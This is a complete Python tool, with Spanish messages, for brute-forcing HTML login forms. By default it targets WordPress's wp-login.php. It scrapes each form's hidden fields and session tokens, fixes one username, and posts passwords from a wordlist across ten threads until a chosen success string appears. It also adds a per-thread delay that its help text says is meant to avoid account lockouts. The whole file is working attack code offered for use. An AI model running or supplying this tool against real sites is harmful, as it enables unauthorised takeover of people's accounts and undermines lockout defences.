import argparse
import queue
import sys
import threading
import time
from io import BytesIO

import requests
from lxml import etree


def get_words(wordlist):
    words = queue.Queue()
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if line:
                words.put(line)
    return words


def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall(".//input"):
        name = elem.get("name")
        if name is not None:
            params[name] = elem.get("value", "")
    return params


class FormBruter:
    def __init__(self, url, username, success, user_field="log", pass_field="pwd", delay=2.0):
        self.url = url
        self.username = username
        self.success = success
        self.user_field = user_field
        self.pass_field = pass_field
        self.delay = delay
        self.found = False
        self.lock = threading.Lock()

    def run(self, passwords, threads=10):
        print(f"\n[*] Iniciando ataque de fuerza bruta contra {self.url}")
        print(f"[*] Usuario fijado a: {self.username}\n")
        workers = []
        for _ in range(threads):
            t = threading.Thread(target=self.worker, args=(passwords,), daemon=True)
            workers.append(t)
            t.start()
        for t in workers:
            t.join()

    def worker(self, passwords):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params[self.user_field] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(self.delay)
            try:
                password = passwords.get_nowait()
            except queue.Empty:
                break

            params[self.pass_field] = password
            print(f"[*] Probando {self.username}/{password}")
            resp1 = session.post(self.url, data=params)

            if self.success in resp1.text:
                with self.lock:
                    if not self.found:
                        self.found = True
                        print("\n[+] Fuerza bruta completada.")
                        print(f"[+] Usuario: {self.username}")
                        print(f"[+] Contrasena: {password}")


def parse_args():
    parser = argparse.ArgumentParser(
        description=(
            "Forzador de autenticacion por formulario HTML: extrae automaticamente los "
            "campos del formulario de login (incluidas cookies y tokens ocultos, via "
            "requests.Session) y prueba contrasenas de una lista contra el. Los nombres de "
            "campo por defecto (log/pwd) corresponden al formulario de WordPress; ajustalos "
            "con -U/-P para otros CMS o formularios personalizados."
        )
    )
    parser.add_argument("url", help="URL del formulario de login (p. ej. http://objetivo/wp-login.php)")
    parser.add_argument("username", help="Nombre de usuario a probar")
    parser.add_argument("wordlist", help="Archivo con una contrasena por linea")
    parser.add_argument(
        "-s", "--success", required=True,
        help="Cadena presente en la respuesta unicamente cuando el login tiene exito",
    )
    parser.add_argument(
        "-U", "--user-field", default="log",
        help="Nombre del campo de usuario en el formulario (por defecto: log, de WordPress)",
    )
    parser.add_argument(
        "-P", "--pass-field", default="pwd",
        help="Nombre del campo de contrasena en el formulario (por defecto: pwd, de WordPress)",
    )
    parser.add_argument("-t", "--threads", type=int, default=10)
    parser.add_argument(
        "-d", "--delay", type=float, default=2.0,
        help="Segundos de espera entre intentos por hilo (mitiga bloqueos de cuenta)",
    )
    return parser.parse_args()


def main():
    args = parse_args()
    passwords = get_words(args.wordlist)
    bruter = FormBruter(
        args.url, args.username, args.success,
        user_field=args.user_field, pass_field=args.pass_field, delay=args.delay,
    )
    try:
        bruter.run(passwords, threads=args.threads)
    except KeyboardInterrupt:
        print("\n[!] Detenido por el usuario.")
        sys.exit(1)

    if not bruter.found:
        print("\n[!] No se encontro ninguna contrasena valida en la lista.")


if __name__ == "__main__":
    main()
